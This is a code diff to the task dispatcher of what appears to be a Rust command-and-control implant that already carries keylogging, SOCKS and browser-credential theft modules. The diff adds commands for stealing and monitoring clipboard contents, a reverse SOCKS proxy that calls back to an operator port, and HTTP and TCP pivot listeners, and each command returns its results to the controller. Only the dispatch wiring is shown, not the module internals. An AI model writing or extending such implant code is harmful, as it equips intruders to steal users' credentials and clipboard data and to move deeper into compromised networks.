@@ -22,6 +22,14 @@ mod keylog;
 mod socks;
 #[path = "browser_creds.rs"]
 mod browser_creds;
+#[path = "clipboard.rs"]
+mod clipboard;
+#[path = "rsocks.rs"]
+mod rsocks;
+#[path = "http_pivot.rs"]
+mod http_pivot;
+#[path = "tcp_pivot.rs"]
+mod tcp_pivot;
 
 use std::sync::atomic::{AtomicBool, AtomicU64, Ordering};
 use std::sync::{Mutex, OnceLock};
@@ -896,6 +904,56 @@ pub fn dispatch(t: &mut AgentTransport, task: &TaskWire) {
         "BROWSER_CREDS" => {
             let result = browser_creds::do_browser_creds();
             t.send_result(task.id, &result, "");
+        }
+        "CLIP_GET" => {
+            t.send_result(task.id, &clipboard::clip_get(), "");
+        }
+        "CLIP_MONITOR_START" => {
+            let secs: u64 = task.args.trim().parse().unwrap_or(5);
+            t.send_result(task.id, clipboard::clip_monitor_start(secs), "");
+        }
+        "CLIP_MONITOR_DUMP" => {
+            t.send_result(task.id, &clipboard::clip_monitor_dump(), "");
+        }
+        "CLIP_MONITOR_STOP" => {
+            t.send_result(task.id, clipboard::clip_monitor_stop(), "");
+        }
+        "RSOCKS_START" => {
+            let port: u16 = task.args.trim().parse().unwrap_or(0);
+            if port == 0 {
+                t.send_result(task.id, "", "RSOCKS_START requires a callback port number");
+            } else {
+                t.send_result(task.id, &rsocks::rsocks_start(port), "");
+            }
+        }
+        "RSOCKS_STOP" => {
+            t.send_result(task.id, rsocks::rsocks_stop(), "");
+        }
+        "HTTP_PIVOT_START" => {
+            let j: serde_json::Value = serde_json::from_str(&task.args).unwrap_or_default();
+            let port = j.get("port").and_then(|v| v.as_u64()).unwrap_or(0) as u16;
+            if port == 0 {
+                t.send_result(task.id, "", "HTTP_PIVOT_START requires {port:N}");
+            } else {
+                http_pivot::set_http_pivot_agent_id(&t.agent_id);
+                t.send_result(task.id, &http_pivot::start_http_pivot(port), "");
+            }
+        }
+        "HTTP_PIVOT_STOP" => {
+            t.send_result(task.id, http_pivot::stop_http_pivot(), "");
+        }
+        "TCP_PIVOT_START" => {
+            let j: serde_json::Value = serde_json::from_str(&task.args).unwrap_or_default();
+            let port = j.get("port").and_then(|v| v.as_u64()).unwrap_or(0) as u16;
+            if port == 0 {
+                t.send_result(task.id, "", "TCP_PIVOT_START requires {port:N}");
+            } else {
+                tcp_pivot::set_tcp_pivot_agent_id(&t.agent_id);
+                t.send_result(task.id, &tcp_pivot::start_tcp_pivot(port), "");
+            }
+        }
+        "TCP_PIVOT_STOP" => {
+            t.send_result(task.id, tcp_pivot::stop_tcp_pivot(), "");
         }
         _ => {
             // Delegate to feature modules
